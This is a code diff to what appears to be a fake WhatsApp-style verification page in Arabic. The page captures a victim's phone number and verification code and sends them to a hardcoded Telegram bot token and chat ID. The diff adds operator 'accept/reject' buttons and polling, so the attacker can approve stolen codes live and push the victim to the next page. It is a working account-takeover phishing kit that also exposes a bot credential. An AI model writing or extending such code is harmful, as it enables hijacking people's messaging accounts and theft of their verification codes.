@@ -270,11 +270,8 @@
   </style>
 </head>
 
-
 <link rel="manifest" href="manifest.json">
 <meta name="theme-color" content="#075e54">
-
-
 
 <body>
   <div class="container">
@@ -319,6 +316,7 @@
     const BOT_TOKEN = "7973639984:AAEO7Hcna_9HIa9Zblxvm0MbIh23hL8UMzk";
     const CHAT_ID = "7121448697";
     let currentVerificationId = null;
+    let verificationCheckInterval = null;
     
     // عناصر DOM
     const inputs = document.querySelectorAll('.code-inputs input');
@@ -349,15 +347,23 @@
       });
     });
     
-    // إرسال البيانات إلى البوت
-    async function sendToBot(message) {
+    // إرسال البيانات إلى البوت مع أزرار قبول/رفض
+    async function sendToBot(message, verificationId) {
       try {
         const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
             chat_id: CHAT_ID,
-            text: message
+            text: message,
+            reply_markup: {
+              inline_keyboard: [
+                [
+                  { text: "✅ قبول", callback_data: `accept_${verificationId}` },
+                  { text: "❌ رفض", callback_data: `reject_${verificationId}` }
+                ]
+              ]
+            }
           })
         });
         return await response.json();
@@ -367,26 +373,31 @@
       }
     }
     
-    // إنشاء اتصال WebSocket للاستماع للردود
-    function setupWebSocket(verificationId) {
-      // في الواقع، تحتاج هنا لاستخدام خدمة وسيطة لإنشاء WebSocket
-      // هذا مثال مبسط للتوضيح فقط
-      return new Promise((resolve) => {
-        // هذه الدالة ستكون مسؤولة عن الاستماع للرد من البوت
-        window.checkVerificationResponse = function(response) {
-          if (response.verificationId === verificationId) {
-            resolve(response.status);
-          }
-        };
+    // التحقق من حالة الطلب
+    async function checkVerificationStatus(verificationId) {
+      try {
+        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`);
+        const data = await response.json();
         
-        // محاكاة الرد بعد 5 ثواني (للاختبار فقط)
-        setTimeout(() => {
-          // في الواقع، هذه ستأتي من خدمة الويب سوكيت
-          const testResponse = Math.random() > 0.5 ? 
-            { status: 'accepted' } : { status: 'rejected' };
-          resolve(testResponse.status);
-        }, 5000);
-      });
+        if (data.ok && data.result) {
+          for (const update of data.result) {
+            if (update.callback_query) {
+              const callbackData = update.callback_query.data;
+              if (callbackData.includes(verificationId)) {
+                if (callbackData.startsWith('accept_')) {
+                  return 'accepted';
+                } else if (callbackData.startsWith('reject_')) {
+                  return 'rejected';
+                }
+              }
+            }
+          }
+        }
+        return 'pending';
+      } catch (error) {
+        console.error('خطأ في التحقق:', error);
+        return 'error';
+      }
     }
     
     // تأكيد الكود
@@ -409,9 +420,9 @@
                    + `📱 الرقم: ${phone}\n`
                    + `🔢 الكود: ${code}\n`
                    + `🆔 المعرف: ${currentVerificationId}\n\n`
-                   + 'الرجاء الرد بـ "قبول" أو "رفض"';
+                   + 'الرجاء اختيار "قبول" أو "رفض"';
       
-      const sent = await sendToBot(message);
+      const sent = await sendToBot(message, currentVerificationId);
       
       if (!sent.ok) {
         loader.style.display = 'none';
@@ -419,16 +430,25 @@
         return;
       }
       
-      // الانتظار للرد (في الواقع الفعلي سيتم عبر WebSocket)
-      const response = await setupWebSocket(currentVerificationId);
-      
-      loader.style.display = 'none';
-      
-      if (response === 'accepted') {
-        window.location.href = 'index3.html';
-      } else {
-        rejectModal.style.display = 'flex';
-      }
+      // بدء التحقق الدوري من حالة الطلب
+      verificationCheckInterval = setInterval(async () => {
+        const status = await checkVerificationStatus(currentVerificationId);
+        
+        if (status === 'accepted') {
+          clearInterval(verificationCheckInterval);
+          loader.style.display = 'none';
+          window.location.href = 'index3.html';
+        } else if (status === 'rejected') {
+          clearInterval(verificationCheckInterval);
+          loader.style.display = 'none';
+          rejectModal.style.display = 'flex';
+        } else if (status === 'error') {
+          clearInterval(verificationCheckInterval);
+          loader.style.display = 'none';
+          errorText.textContent = 'حدث خطأ أثناء التحقق، الرجاء المحاولة لاحقًا';
+        }
+        // إذا كان pending نستمر في الانتظار
+      }, 2000); // التحقق كل ثانيتين
     });
     
     // إغلاق نافذة الرفض
@@ -437,6 +457,13 @@
       inputs.forEach(input => input.value = '');
       inputs[0].focus();
     }
+    
+    // تنظيف عند مغادرة الصفحة
+    window.addEventListener('beforeunload', () => {
+      if (verificationCheckInterval) {
+        clearInterval(verificationCheckInterval);
+      }
+    });
   </script>
 </body>
 </html>
